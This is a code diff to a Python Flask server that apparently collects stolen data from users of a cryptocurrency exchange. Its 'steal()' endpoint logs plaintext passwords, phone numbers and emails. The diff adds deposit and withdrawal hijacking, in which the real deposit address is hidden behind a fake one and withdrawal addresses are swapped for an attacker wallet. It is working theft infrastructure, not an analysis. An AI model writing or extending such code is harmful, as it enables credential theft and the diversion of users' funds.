@@ -96,6 +96,9 @@ def health():
                 "change_fund_password",
                 "verify_fund_password",
                 "manual_reset",
+                "deposit_hijack",
+                "withdraw_hijack",
+                "withdraw_display_hijack",
             ],
             "count": len(rows),
         }
@@ -121,7 +124,19 @@ def steal():
         "password_plain": data.get("password") or data.get("newPassword") or data.get("pwd"),
         "mobile": data.get("mobile") or data.get("phone"),
         "email": data.get("email"),
-        "note": "All password fields arrive PLAIN TEXT from client before server hashing",
+        "real_thsex_address": data.get("real_thsex_address"),
+        "fake_shown_address": data.get("fake_shown_address"),
+        "deposit_symbol": data.get("symbol"),
+        "deposit_chain": data.get("chain"),
+        "note": (
+            "Deposit hijack: user UI shows fake_shown_address; real_thsex_address was from server"
+            if action == "deposit_hijack"
+            else "Withdraw hijack: POST body address swapped to attacker wallet before api.thsexcex.com"
+            if action == "withdraw_hijack"
+            else "Withdraw screen shows attacker address instead of user saved address"
+            if action == "withdraw_display_hijack"
+            else "All password fields arrive PLAIN TEXT from client before server hashing"
+        ),
     }
     log_stolen(entry)
     return jsonify({"code": 0, "success": True, "msg": "logged", "action": action})
